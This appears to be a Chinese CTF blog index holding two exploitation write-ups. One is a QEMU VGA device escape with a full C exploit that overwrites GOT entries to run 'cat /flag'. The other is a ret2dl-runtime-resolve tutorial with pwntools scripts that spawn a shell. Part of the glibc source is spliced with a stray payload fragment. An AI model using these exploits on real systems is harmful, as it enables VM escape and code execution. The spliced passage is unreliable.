max_size时，opaque-&gt;vs[idx].buf[cur_size++] = mem_value &amp; 0xffv5==2时，printf_chk(1, opaque-&gt;vs[idx].buf)v5==3时，opaque-&gt;vs[idx].max_size = mem_value &amp; 0xfffv5==4时，opaque-&gt;vs[idx].buf[cur_size++] = mem_value &amp; 0xff\n\n需要吐槽的是，这两次汇编语言表达的意思一样但是表达的形式不一样，所以莫名其妙的需要依靠汇编来逆向。\n.text:000000000068F521 48 81 C2 3D 13 00 00          add     rdx, 133Dh.text:000000000068F528 48 C1 E2 04                   shl     rdx, 4.text:000000000068F52C 48 8B 74 13 08                mov     rsi, [s+rdx+8].text:000000000068F531 48 85 F6                      test    rsi, rsi.text:000000000068F534 0F 84 24 FD FF FF             jz      loc_68F25E.text:000000000068F534.text:000000000068F53A 48 83 C4 18                   add     rsp, 18h.text:000000000068F53E BF 01 00 00 00                mov     edi, 1.text:000000000068F543 31 C0                         xor     eax, eax.text:000000000068F545 5B                            pop     s.text:000000000068F546 5D                            pop     rbp.text:000000000068F547 E9 F4 99 D7 FF                jmp     ___printf_chk······.text:000000000068F47B 48 89 E9                      mov     rcx, rbp.text:000000000068F47E 48 C1 E1 04                   shl     rcx, 4.text:000000000068F482 48 01 CB                      add     s, rcx.text:000000000068F485 48 85 C0                      test    rax, rax.text:000000000068F488 48 89 83 D8 33 01 00          mov     [rbx+133D8h], rax.text:000000000068F48F 0F 84 C9 FD FF FF             jz      loc_68F25E.text:000000000068F48F.text:000000000068F495 48 8B 54 24 08                mov     rdx, qword ptr [rsp+28h+chunk_size].text:000000000068F49A 48 83 C5 01                   add     rbp, 1.text:000000000068F49E 48 89 2D 3B A0 A3 00          mov     cs:vulncnt, rbp.text:000000000068F4A5 81 E2 FF FF 00 00             and     edx, 0FFFFh.text:000000000068F4AB 89 93 E0 33 01 00             mov     [rbx+133E0h], edx.text:000000000068F4B1 E9 A8 FD FF FF                jmp     loc_68F25E\n\n上面可以看到漏洞点是v5 == 4时，对cur_size没有检测，可以实现堆溢出，当然我感觉三可以修改最大size配合二也是可以实现堆溢出，但是直接用四即可实现所以也没必要再去搞三二了。\n再就是存在一个大的问题就是，上面所有对idx的验证就是小于等于16，所以这一出也就导致我们可以溢出到下一个成员latch\nuint64_t __fastcall cydf_vga_mem_read(CydfVGAState *opaque, hwaddr addr, uint32_t size)&#123;  uint32_t v3; // eax  bool v4; // zf  uint64_t result; // rax  char *v6; // rcx  unsigned int v7; // edx  unsigned int v8; // edx  v3 = opaque-&gt;latch[0];  if ( !(_WORD)v3 )  &#123;    v4 = (opaque-&gt;vga.sr[7] &amp; 1) == 0;    opaque-&gt;latch[0] = addr | v3;    if ( !v4 )      goto LABEL_3;    return vga_mem_readb(&amp;opaque-&gt;vga, addr);  &#125;  v4 = (opaque-&gt;vga.sr[7] &amp; 1) == 0;  opaque-&gt;latch[0] = (_DWORD)addr &lt;&lt; 16;  if ( v4 )    return vga_mem_readb(&amp;opaque-&gt;vga, addr);LABEL_3:  if ( addr &gt; 0xFFFF )  &#123;    result = 255LL;    if ( addr - 0x18000 &lt;= 0xFF &amp;&amp; (opaque-&gt;vga.sr[23] &amp; 0x44) == 4 )      return cydf_mmio_blt_read(opaque, (unsigned __int8)addr);  &#125;  else  &#123;    result = 0xFFLL;    v6 = (char *)opaque + 4 * (addr &gt;&gt; 15);    v7 = addr &amp; 0x7FFF;    if ( v7 &lt; *((_DWORD *)v6 + 0x44D5) )    &#123;      v8 = *((_DWORD *)v6 + 0x44D3) + v7;      if ( (opaque-&gt;vga.gr[11] &amp; 0x14) == 20 )      &#123;        v8 *= 16;      &#125;      else if ( (opaque-&gt;vga.gr[11] &amp; 2) != 0 )      &#123;        v8 *= 8;      &#125;      return opaque-&gt;vga.vram_ptr[opaque-&gt;cydf_addr_mask &amp; v8];    &#125;  &#125;  return result;&#125;\n\n而在这个函数中其实是可以控制latch[0]的值的。\nswitch ( (char)sr_index )&#123;  case 0:  case 1:  case 2:  case 3:  case 4:    opaque-&gt;vga.sr[(unsigned __int8)sr_index] = sr_mask[(unsigned __int8)sr_index] &amp; v4;    if ( (_BYTE)sr_index == 1 )      goto LABEL_35;    break;  case 6:    opaque-&gt;vga.sr[6] = 3 * ((v4 &amp; 0x17) == 18) + 15;    break;  case 7:    cydf_update_memory_access(opaque);    sr_index = opaque-&gt;vga.sr_index;    goto LABEL_28;  case 8:  case 9:  case 0xA:  case 0xB:  case 0xC:  case 0xD:  case 0xE:  case 0xF:  case 0x13:  case 0x14:  case 0x15:  case 0x16:  case 0x18:  case 0x19:  case 0x1A:  case 0x1B:  case 0x1C:  case 0x1D:  case 0x1E:  case 0x1F:  case 0xCC:  case 0xCD:  case 0xCE:    LABEL_28:    opaque-&gt;vga.sr[sr_index] = v4;    break;&#125;\n\n而在这里我们正好可以控制opaque-&gt;vga.sr[0xCC]的值。\nint qemu_log(const char *fmt, ...)&#123;  __int64 v1; // rdx  __int64 v2; // rcx  __int64 v3; // rsi  __int64 v4; // r8  __int64 v5; // r9  int ret; // [rsp+1Ch] [rbp-D4h]  gcc_va_list va; // [rsp+20h] [rbp-D0h] BYREF  unsigned __int64 v9; // [rsp+38h] [rbp-B8h]  __int64 v10; // [rsp+48h] [rbp-A8h]  __int64 v11; // [rsp+50h] [rbp-A0h]  __int64 v12; // [rsp+58h] [rbp-98h]  __int64 v13; // [rsp+60h] [rbp-90h]  __int64 v14; // [rsp+68h] [rbp-88h]  va_start(va, fmt);  v3 = va_arg(va, _QWORD);  v1 = va_arg(va, _QWORD);  v2 = va_arg(va, _QWORD);  v4 = va_arg(va, _QWORD);  v5 = va_arg(va, _QWORD);  va_end(va);  v10 = v3;  v11 = v1;  v12 = v2;  v13 = v4;  v14 = v5;  v9 = __readfsqword(0x28u);  ret = 0;  if ( qemu_logfile )  &#123;    va_start(va, fmt);    va_arg(va, _QWORD);    va_arg(va, _QWORD);    va_arg(va, _QWORD);    va_arg(va, _QWORD);    va_arg(va, _QWORD);    ret = vfprintf(qemu_logfile, fmt, va);    if ( ret &lt; 0 )      return 0;  &#125;  return ret;&#125;\n\n在qemu_log函数中，存在一个vfprintf函数调用了bss上的一个变量qemu_logfile。那么利用思路如下：\n\n  修改qemu_logfile的内容为cat /flag\n  修改vfprintf函数的got表为system\n  修改printf_chk函数的got表为qemu_log\n  最后让v5等于2，触发printf_chk\n\n漏洞利用先吐槽一点\nswitch ( addr )&#123;  case 4uLL:  case 0x24uLL:  opaque-&gt;vga.cr_index = value;  break;  case 5uLL:  case 0x25uLL:  cr_index = opaque-&gt;vga.cr_index;  if ( (unsigned __int8)cr_index &lt;= 0x18u )  &#123;  if ( (opaque-&gt;vga.cr[17] &amp; 0x80u) == 0 || (unsigned __int8)cr_index &gt; 7u )  &#123;  opaque-&gt;vga.cr[(unsigned __int8)cr_index] = value;  if ( (_BYTE)cr_index != 24 &amp;&amp; ((1LL &lt;&lt; cr_index) &amp; 0x8200F1) != 0 )  LABEL_35:  opaque-&gt;vga.update_retrace_info((VGACommonState *)opaque);  &#125;  else if ( (_BYTE)cr_index == 7 )  &#123;  opaque-&gt;vga.cr[7] = value &amp; 0x10 | opaque-&gt;vga.cr[7] &amp; 0xEF;  &#125;  &#125;  else if ( (unsigned __int8)cr_index &lt;= 0x1Du )  &#123;  opaque-&gt;vga.cr[cr_index] = value;  &#125;  break;  case 0xAuLL:  case 0x2AuLL:  opaque-&gt;vga.fcr = value &amp; 0x10;  break;  case 0x10uLL:  ar_flip_flop = opaque-&gt;vga.ar_flip_flop;  if ( ar_flip_flop )  &#123;  v13 = opaque-&gt;vga.ar_index &amp; 0x1F;  switch ( opaque-&gt;vga.ar_index &amp; 0x1F )  &#123;  case 0:  case 1:  case 2:  case 3:  case 4:  case 5:  case 6:  case 7:  case 8:  case 9:  case 0xA:  case 0xB:  case 0xC:  case 0xD:  case 0xE:  case 0xF:  case 0x12:  opaque-&gt;vga.ar[v13] = value &amp; 0x3F;  break;  case 0x10:  opaque-&gt;vga.ar[v13] = value &amp; 0xEF;  break;  case 0x11:  goto LABEL_42;  case 0x13:  case 0x14:  LOBYTE(value) = value &amp; 0xF;  LABEL_42:  opaque-&gt;vga.ar[v13] = value;  break;  default:  break;  &#125;  &#125;  else  &#123;  opaque-&gt;vga.ar_index = value &amp; 0x3F;  &#125;  opaque-&gt;vga.ar_flip_flop = ar_flip_flop ^ 1;  break;  case 0x12uLL:  opaque-&gt;vga.msr = value &amp; 0xEF;  opaque-&gt;vga.update_retrace_info((VGACommonState *)opaque);  break;  case 0x14uLL:  opaque-&gt;vga.sr_index = value;  break;  ... ...&#125;\n\n着狗屎ida翻译的是0x14\n.text:000000000068F5F6 48 81 EB B4 03 00 00          sub     addr, 3B4h                      ; switch 39 cases.text:000000000068F5FD 48 83 FB 26                   cmp     rbx, 26h.text:000000000068F601 77 C1                         ja      short def_68F603                ; jumptable 000000000068F603 default case, cases 950-953,955-959,961,963,970-973,976-979,982-985.text:000000000068F601                                                                       ; jumptable 000000000068F792 default case, cases 5,32-47,50-79,82-111,114-143,146-175,178-203,207,210-239.text:000000000068F601.text:000000000068F603 FF 24 DD 78 8E A9 00          jmp     ds:jpt_68F603[rbx*8]            ; switch jump\n\n 在这里是减去0x3B4\n\n但是这里真正需要的是0x10，又一次翻译错误。\n忽略这些小错误之后直接编写exp即可\n综上，可得exp#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)void die(const char *msg)&#123;    perror(msg);    exit(-1);&#125;size_t va2pa(void *addr)&#123;    uint64_t data;    int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);    if (!fd)    &#123;        perror(&quot;open pagemap&quot;);        return 0;    &#125;    size_t offset = ((uintptr_t)addr / PAGE_SIZE) * sizeof(uint64_t);    if (lseek(fd, offset, SEEK_SET) &lt; 0)    &#123;        puts(&quot;lseek&quot;);        close(fd);        return 0;    &#125;    if (read(fd, &amp;data, 8) != 8)    &#123;        puts(&quot;read&quot;);        close(fd);        return 0;    &#125;    if (!(data &amp; (((uint64_t)1 &lt;&lt; 63))))    &#123;        puts(&quot;page&quot;);        close(fd);        return 0;    &#125;    size_t pageframenum = data &amp; ((1ull &lt;&lt; 55) - 1);    size_t phyaddr = pageframenum * PAGE_SIZE + (uintptr_t)addr % PAGE_SIZE;    close(fd);    return phyaddr;&#125;uint32_t vga_addr = 0xa0000;uint32_t vga_size = 0x20000;unsigned char *mmio_mem;unsigned char *vga_mem;void set_sr(unsigned int idx, unsigned int val)&#123;    outb(idx, 0x3c4);    outb(val, 0x3c5);&#125;void vga_mem_write(uint32_t addr, uint8_t value)&#123;    *((uint8_t *)(vga_mem + addr)) = value;&#125;void set_latch(uint32_t value)&#123;    char a;    a = vga_mem[(value &gt;&gt; 16) &amp; 0xffff]; // write hight    write(1, &amp;a, 1);    a = vga_mem[value &amp; 0xffff]; // write low    write(1, &amp;a, 1);&#125;int main()&#123;    system(&quot;mknod -m 660 /dev/mem c 1 1&quot;);    int fd = open(&quot;/dev/mem&quot;, O_RDWR | O_SYNC);    if (fd == -1)    &#123;        return 0;    &#125;    vga_mem = mmap(NULL, vga_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, vga_addr);    if (!vga_mem)    &#123;        die(&quot;mmap vga mem failed&quot;);    &#125;    if (ioperm(0x3b0, 0x30, 1) == -1)    &#123;        die(&quot;cannot ioperm&quot;);    &#125;    set_sr(7, 1);       // bypass first if    set_sr(0xcc, 4);    // v7==4    set_sr(0xcd, 0x10); // vs[0x10]    unsigned long long int bss = 0x109e000 + 0x500;    unsigned long long int qemu_logfile = 0x10CCBE0;    unsigned long long int vfprintf_got = 0xee7bb0;    unsigned long long int system_plt = 0x409dd0;    unsigned long long int printf_chk_got = 0xee7028;    unsigned long long int qemu_log = 0x9726E8;    char cat_flag[] = &quot;cat /flag&quot;;    char a;    char *payload;    int cur_size = 0;    a = vga_mem[1];    write(1, &amp;a, 1);    set_latch(bss);    for (int i = 0; i &lt; 9; i++)    &#123;        write(1, &amp;cat_flag[i], 1);        vga_mem_write(0x18100, cat_flag[i]);    &#125;    cur_size += 9;    set_latch(qemu_logfile - cur_size);    payload = (char *)&amp;bss;    for (int i = 0; i &lt; 8; i++)    &#123;        write(1, &amp;payload[i], 1);        vga_mem_write(0x18100, payload[i]);    &#125;    cur_size += 8;    set_latch(vfprintf_got - cur_size);    payload = (char *)&amp;system_plt;    for (int i = 0; i &lt; 8; i++)    &#123;        write(1, &amp;payload[i], 1);        vga_mem_write(0x18100, payload[i]);    &#125;    cur_size += 8;    set_latch(printf_chk_got - cur_size);    payload = (char *)&amp;qemu_log;    for (int i = 0; i &lt; 8; i++)    &#123;        write(1, &amp;payload[i], 1);        vga_mem_write(0x18100, payload[i]);    &#125;    cur_size += 8;    set_sr(0xcc, 2);    vga_mem_write(0x18100, 1);    return 0;&#125;\n\n\n\n参考链接:  https://www.anquanke.com/post/id/224199#h3-11  https://devcraft.io/2018/11/22/q-escape-seccon-2018.html  https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga.c#L2004  https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga_internal.h题目链接:  https://github.com/196082/196082/blob/main/qemu_escape/q-escape.zip\n","categories":["qemu escape"],"tags":["mmio","pmio","vga"]},{"title":"ret2dl-runtime-resolve","url":"/2022/02/03/ret2dl-runtime-resolve/","content":"前段时间因为身体原因摆烂了一周多了，今天又才重新开始做题，报了几场比赛都没能打成就很烦。\nret2dl-runtime-resolve首先ELF文件的引用外部文件的加载方式分为三种FULL_RELRO、PARTIAL_RELRO、NO_RELRO，在后面两种的情况下存在地址延迟加载。\nNO_RELRO\n可以看到在第一次调用read函数的时候，此时会先根据GOT表的位置进行jmp到read@plt+6的位置，然后经过两次push之后到_dl_runtime_resolve函数。\n在源码中dl_runtime_resolve函数只是call了一下_dl_fixup函数。\n#ifndef reloc_offset  # define reloc_offset reloc_arg  # define reloc_index  reloc_arg / sizeof (PLTREL)  #endif  DL_FIXUP_VALUE_TYPE  attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE  _dl_fixup (  # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS      ELF_MACHINE_RUNTIME_FIXUP_ARGS,  # endif      struct link_map *l, ElfW(Word) reloc_arg) &#123;      //获取symtab（存放dynsym的数组）      const ElfW(Sym) *const symtab          = (const void *) D_PTR (l, l_info[DT_SYMTAB]);      //获取strtab(存放符号名的数组)       const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);      //获取reloc_arg对应的rel.plt项       const PLTREL *const reloc          = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);      //获取reloc_arg对应的dynsym       const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];      const ElfW(Sym) *refsym = sym;      //指向对应的got表，以便将解析结果写回去       void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);      lookup_t result;      DL_FIXUP_VALUE_TYPE value;        /* Sanity check that we&#x27;re really looking at a PLT relocation.  */      assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);        /* Look up the target symbol.  If the normal lookup rules are not        used don&#x27;t look in the global scope.  */      if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123;          const struct r_found_version *version = NULL;            if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) &#123;              const ElfW(Half) *vernum =                  (const void *) D_PTR (l, l_info[VERSYMID# payload = p64(0)+p64(0x4011DD)+b&#x27;\\x00&#x27;*(0x58-0x10)+p64(fake_dynrel_addr) + \\#     p64(pop_rdi)+p64(bss+0xa0-0x8) +\\#     p64(plt_load)+p64(fake_link_map_addr)+p64(0)# payload = payload.ljust(0xa0-8, b&#x27;\\x00&#x27;)+b&#x27;/bin/sh\\x00&#x27; + \\#     p64(bss+0x58)+p64(leave_ret)# gdb.attach(r)X (DT_VERSYM)]);              ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;              version = &amp;l-&gt;l_versions[ndx];              if (version-&gt;hash == 0)                  version = NULL;          &#125;            /* We need to keep the scope around so do some locking.  This is         not necessary for objects which cannot be unloaded or when          we are not using any threads (yet).  */          int flags = DL_LOOKUP_ADD_DEPENDENCY;          if (!RTLD_SINGLE_THREAD_P) &#123;              THREAD_GSCOPE_SET_FLAG ();              flags |= DL_LOOKUP_GSCOPE_LOCK;          &#125;    #ifdef RTLD_ENABLE_FOREIGN_CALL          RTLD_ENABLE_FOREIGN_CALL;  #endif          //根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中           result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,                                        version, ELF_RTYPE_CLASS_PLT, flags, NULL);            /* We are done with the global scope.  */          if (!RTLD_SINGLE_THREAD_P)              THREAD_GSCOPE_RESET_FLAG ();    #ifdef RTLD_FINALIZE_FOREIGN_CALL          RTLD_FINALIZE_FOREIGN_CALL;  #endif            //得到结果           value = DL_FIXUP_MAKE_VALUE (result,                                       sym ? (LOOKUP_VALUE_ADDRESS (result)                                              + sym-&gt;st_value) : 0);      &#125; else &#123;          /* We already found the symbol.  The module (and therefore its load         address) is also known.  */          value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);          result = l;      &#125;        /* And now perhaps the relocation addend.  */      value = elf_machine_plt_value (l, reloc, value);        if (sym != NULL              &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))          value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));        /* Finally, fix up the plt itself.  */      if (__glibc_unlikely (GLRO(dl_bind_not)))          return value;      //将结果写回到got表中       return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  &#125;  \n\n根据源码内容可以看出来解析时是根据符号名的字符串来解析函数的。\n#include &lt;unistd.h&gt;  #include &lt;string.h&gt;  void fun()&#123;      char buffer[0x20];      read(0,buffer,0x200);  &#125;  int main()&#123;      fun();      return 0;  &#125;  // gcc test.c -z norelro -no-pie -fno-stack-protector -m32 -o ret2dlsolve2  \n\n现在我们创建这样一个漏洞程序。\n在NO_RELRO情况下，因为dynamic可以修改，因此，我们直接修改dynamic的strtab，将它指向我们可控的区域，然后在可控区域对应的位置布置下需要的函数的名字即可，即伪造dynstr。\n\n可以看到上面是有可读可写的权限的。\n\n指向的位置存在这样几个字符串。\nexp如下:\nfrom pwn import *r = process(&#x27;./ret2dlsolve2&#x27;)elf = ELF(&#x27;./ret2dlsolve2&#x27;)pop_ebp = 0x0804848bleave_ret = 0x08048358read_plt = elf.plt[&#x27;read&#x27;]read_plt_load = elf.plt[&#x27;read&#x27;]+6bss = elf.bss()target = 0x804961C+4payload = b&#x27;a&#x27;*(0x28+0x4)+p32(pop_ebp)+p32(bss+0x300) + \\    p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x300)+p32(0x1000)r.sendline(payload)fake_str = b&#x27;\\x00libc.so.6\\x00_IO_stdin_used\\x00system\\x00&#x27;payload = b&#x27;a&#x27;*0x4+p32(read_plt)+p32(read_plt_load) + \\    p32(0)+p32(target)+p32(0x100)payload = payload.ljust(0x50, b&#x27;\\x00&#x27;)+fake_strr.sendline(payload)payload = p32(bss+0x350)+b&#x27;;sh&#x27;r.sendline(payload)r.interactive()\n\n64位相较于32位比较类似，又因为参数是在寄存器内保存的所以，直接一次ROP即可解决。\nPARTIAL_RELRO首先再更深层次的观察_dl_runtime_resolve函数的作用。\n\n这一步和上面一样，但是上面没有提到这两个push的作用，先继续往后看。\n\n上面的0是reloc_arg，下面的0xf7ffd918则是link_map的地址。\n\n通过这个地址即可找到.dynamic的地址，也就是上图中的第三个\n\n.dynamic：是ld.so使用的动态链接信息，在/etc/ld.so.conf文件中存放着需要动态加载的目录，使用ldconfig就可以将ld.so.conf中的指定目录的库文件加载到内存中，并记录在/etc/ld.so.cache文件中。ld.so.1文件就可以在高速缓存中访问动态库文件，提高访问速度。导入动态链接库，可以在/etc/ld.so.conf文件中配置，或者使用LD_LIBRARY_PATH环境变量进行引用。\n\n再根据.dynamic的地址找到另外几个结构的地址\n\n其中的地址信息是:\n.dynstr 的地址是 .dynamic + 0x44 -&gt; 0x0804821c\n\n.dynstr：动态链接的字符串表，保存动态链接所需的字符串。比如符号表中的每个符号都有一个 st_name(符号名)，他是指向字符串表的索引，这个字符串表可能就保存在 .dynstr，而.dynstr结构为正常的字符串数组。\n\n.dynsym 的地址是 .dynamic + 0x4c -&gt; 0x080481cc\n\n.dynsym：动态链接的符号表，保存需要动态连接的符号表，而.dynsym结构如下\n\ntypedef struct&#123;  Elf32_Word    st_name; //符号名相对.dynstr起始的偏移    Elf32_Addr    st_value;  Elf32_Word    st_size;  unsigned char st_info;  unsigned char st_other;  Elf32_Section st_shndx;&#125;Elf32_Sym; \n\n.rel.plt 的地址是 .dynamic + 0x84 -&gt; 0x08048298\n\n.rel.plt：节的每个表项对应了所有外部过程调用符号的重定位信息。而.rel.plt结构如下\n\ntypedef struct&#123;  Elf32_Addr r_offset;//指向GOT表的指针，即该函数在got表的偏移  Elf32_Word r_info;&#125;Elf32_Rel\n\n.rel.plt 的地址加上参数 reloc_arg，即 0x08048298 + 0 -&gt; 0x08048298\n找到的就是函数的重定位表项 Elf32_Rel 的指针，记作 rel\n\n通过rel就可以获得Elf32_Rel结构体的数据\nr_offset=0x0804a00c;r_info=0x00000107;\n\n将r_info&gt;&gt;8得到4也就得到了.dynsym中的下标。\n\n从上往下从0开始，找到与下标相同的行获得第一列的数据根据即为name_offset\n\n为什么是第一列是因为第一列的值其实就是上面写的偏移\n再根据.dynstr+name_offset获得函数名的字符串。\n\n最后再根据得到的字符串来执行函数。\n梳理一下1.首先push两个参数进入，随后执行_dl_runtime_resolve\n2.根据link_map找到.dynamic地址\n3.根据.dynamic找到.dynstr    .dynsym     .rel.plt\n4.根据reloc_arg找到Elf32_Rel的指针rel\n5.拿到r_info经过移位拿到index\n6.根据index拿到name_offset结合.dynstr计算出函数的名字\n\nrel_addr = .rel.plt_addr + reloc_arg\nfake_rel_addr = .rel.plt_addr + fake_reloc_arg\nfake_reloc_arg = fake_rel_addr - rel_addr + reloc_arg\n根据以上简单的运算就可以实现伪造rel的地址\n\n\nname_offset_addr=((r_info - 0x7)&gt;&gt;8)*0x10+.dynsym_addr\nfake_name_offset_addr=((r_info - 0x7)&gt;&gt;8)*0x10+fake_dynsym_addr\nr_info = (((fake_dynsym_addr - .dynsym_addr) / 16) &lt;&lt; 8) + 0x7\n这里伪造出rel当中的r_info的值\n\n\n根据上面ida调试的截图很容易可以看出来dynsym的伪造很简单只需要按照原本的模式写就行\nfake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)\n\n最终构造exp\nfrom pwn import *r = process(&#x27;./ret2dlsolve&#x27;)elf = ELF(&#x27;./ret2dlsolve&#x27;)read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]read_load_plt = 0x80482d0leave_ret = 0x08048378pop_ebp = 0x080484abdynstr_addr = 0x0804821cdynsym_addr = 0x080481ccrel_addr = 0x08048298bss = elf.bss()payload = b&#x27;a&#x27;*(0x28+0x4)+p32(pop_ebp)+p32(bss+0x800) + \\    p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x800)+p32(0x1000)r.sendline(payload)fake_dynsym_addr = bss+0x910system_str = bss+0x900fake_rel = p32(read_got) + \\    p32((((fake_dynsym_addr - dynsym_addr) // 16) &lt;&lt; 8) + 0x7)fake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)fake_rel_addr = fake_dynsym_addr+len(fake_dynsym)bin_sh_addr = bss+0x900+len(b&#x27;system\\x00&#x27;)payload = b&#x27;a&#x27;*0x4+p32(read_load_plt)+p32(fake_rel_addr -                                          rel_addr)+p32(0)+p32(bin_sh_addr)payload += payload.ljust(0x100, b&#x27;\\x00&#x27;) + \\    b&#x27;system\\x00/bin/sh&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)payload += fake_dynsym+fake_relr.sendline(payload)r.interactive()\n\n下面是64位的情况，64位不能直接伪造rel.plt\nif (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)   &#123;     const ElfW(Half) *vernum =(const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);     ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;     version = &amp;l-&gt;l_versions[ndx];     if (version-&gt;hash == 0)       version = NULL;   &#125; \n\n这里，出现了访问未映射的内存，主要原因就是reloc-&gt;r_info过大，bss段一般所在位置在0x600000然而真正的rel.plt一般在0x400000。\nif (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123;          ...  &#125; else &#123;          /* We already found the symbol.  The module (and therefore its load         address) is also known.  */          value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);          result = l;  &#125;  \n\n解决办法是绕过这个if判断进入else。\ntypedef struct  &#123;    Elf64_Word    st_name;        /* Symbol name (string tbl index) */    unsigned char st_info;        /* Symbol type and binding */    unsigned char st_other;       /* Symbol visibility */    Elf64_Section st_shndx;       /* Section index */    Elf64_Addr    st_value;       /* Symbol value */    Elf64_Xword   st_size;        /* Symbol size */  &#125; Elf64_Sym;  \n\n如果我们伪造link_map，让sym-&gt;value为某一个已经解析了的函数地址，让l-&gt;addr为我们需要的函数地址到已知函数地址的偏移，那么l-&gt;l_addr + sym-&gt;st_value也就等于我们需要的函数地址。\n比如，如果我们把read_got-8处当作sym那么sym-&gt;st_value也就等于read的地址，并且st_other正好也不为0，同时绕过了if，一举两得。\n此时的rel结构为:\ntypedef struct&#123;  Elf64_Addr        r_offset;                /* Address */  Elf64_Xword        r_info;                        /* Relocation type and symbol index */  Elf64_Sxword        r_addend;                /* Addend */&#125; Elf64_Rela;/* How to extract and insert information held in the r_info field.  */#define ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)#define ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)#define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))\n\n\n在动态调试也可以看到raed在符号表中的偏移为1(0x100000007&gt;&gt;32)\n还有注意的就是我们需要伪造这个数组里的几个指针，它们分别是\nDT_STRTAB指针：位于link_map_addr +0x68(32位下是0x34)\nDT_SYMTAB指针：位于link_map_addr + 0x70(32位下是0x38)\nDT_JMPREL指针：位于link_map_addr +0xF8(32位下是0x7C)\n(其实我也不知道怎么调用的system，我猜测是因为DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);这句话的原因吧，希望知道的大师傅可以评论一下)\n综上得出exp:\nfrom pwn import *r = process(&#x27;./ret2dlsolve_64&#x27;)elf = ELF(&#x27;./ret2dlsolve_64&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)pop_rdi = 0x00000000004005c3pop_rsi_r15 = 0x00000000004005c1read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]read_load_plt = 0x4003f6bss = elf.bss()l_addr = libc.sym[&#x27;system&#x27;] - libc.sym[&#x27;read&#x27;]payload = b&#x27;a&#x27;*(0x20+0x8)+p64(pop_rdi)+p64(0) + \\    p64(pop_rsi_r15)+p64(bss+0x100)+p64(0) + \\    p64(read_plt)+p64(elf.symbols[&#x27;fun&#x27;])r.sendline(payload)dynstr_addr = 0x400318 # str tablefake_link_map_addr = bss+0x100r_offset = fake_link_map_addr + l_addr * -1 - 8l_addr = l_addr &amp; (2**64-1)fake_strtab = p64(0)+p64(dynstr_addr)fake_strtab_addr = fake_link_map_addr+0x8fake_symtab = p64(0)+p64(read_got-0x8)fake_symtab_addr = fake_link_map_addr+0x18fake_dynrel_addr = fake_link_map_addr+0x28fake_rel_addr = fake_link_map_addr+0x38fake_dynrel = p64(0)+p64(fake_rel_addr)fake_rel = p64(r_offset)+p64(0x7)+p64(0)fake_link_map = p64(l_addr)+fake_strtab+fake_symtab+fake_dynrel+fake_relfake_link_map = fake_link_map.ljust(0x68, b&#x27;\\x00&#x27;)fake_link_map += p64(fake_strtab_addr)+p64(fake_symtab_addr)fake_link_map = fake_link_map.ljust(0xf8,b&#x27;\\x00&#x27;)+p64(fake_dynrel_addr)fake_link_map = fake_link_map.ljust(0x100,b&#x27;\\x00&#x27;)+b&#x27;/bin/sh&#x27;r.sendline(fake_link_map)bin_sh_addr = fake_link_map_addr+0x100payload = b&#x27;a&#x27;*(0x20+0x8)+p64(pop_rdi) + \\    p64(bin_sh_addr)+p64(read_load_plt) + \\    